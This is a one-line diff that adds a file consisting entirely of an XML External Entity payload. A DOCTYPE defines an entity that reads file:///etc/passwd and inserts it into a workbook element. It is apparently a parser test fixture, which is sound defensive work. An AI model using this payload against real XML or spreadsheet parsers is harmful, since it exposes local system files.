@@ -1,0 +1,1 @@
+<!DOCTYPE workbook [<!ENTITY x SYSTEM 'file:///etc/passwd'>]><workbook>&x;</workbook>
